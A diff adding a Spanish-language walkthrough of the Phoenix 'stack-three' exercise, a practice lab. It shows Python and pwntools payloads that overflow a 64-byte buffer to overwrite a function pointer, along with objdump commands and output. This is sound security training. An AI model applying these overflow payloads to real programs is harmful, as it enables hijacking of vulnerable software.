@@ -110,4 +110,50 @@ Aquí hay que sobreescribir la varaible pero con un valor en conreto, lo desensa
 [user@phoenix]:$ ./stack-one $(python -c "print 'A'* 64 + '\x62\x59\x6c\x49'") 
         Well done, you have successfully set changeme to the correct value
 ```
+-----------------------------------------------------------------------------------------
+
+## Stack - Three
+
+Aqui hay un buffer de 64 bytes seguido por un puntero de función [Aqui](https://github.com/CUCUxii/Informatica/blob/main/Binarios/Stack.md#sobreescribir-un-puntero-de-instruccion) lo explico con detalle.
+
+```console
+[user@phoenix]:$ objdump -d ./stack-three | grep "^0"
+...
+000000000040069d <complete_level>:
+...
+```
+
+El aunto es que tanto al ponerlo en oneliner o exploit no da buenos resultados, metiendo una "0xa" donde no debe. 
+
+```console
+[user@phoenix]:$ python -c "print 'A' * 64 + '\x9d\x06\x40\x00'" | ./stack-three 
+calling function pointer @ 0xa0040069d; Segmentation fault
+```
+```python
+from struct import pack
+payload = 'A' * 64
+payload += pack("I", 0x40069d)
+print(payload)
+```
+
+Pero hay otro módulo llamado "pwntools" que está pensado parala explotación de bianrios (entre otras)
+```python
+from pwn import *
+payload = 'A' * 64
+payload += p64(0x40069d)
+print(payload)
+```
+```console
+[user@phoenix]:$ python /tmp/exploit.py | ./stack-three 
+calling function pointer @ 0x40069d; Congratulations, you've finished phoenix/stack-three :-) Well done!
+```
+
+
+
+
+
+
+
+
+
 
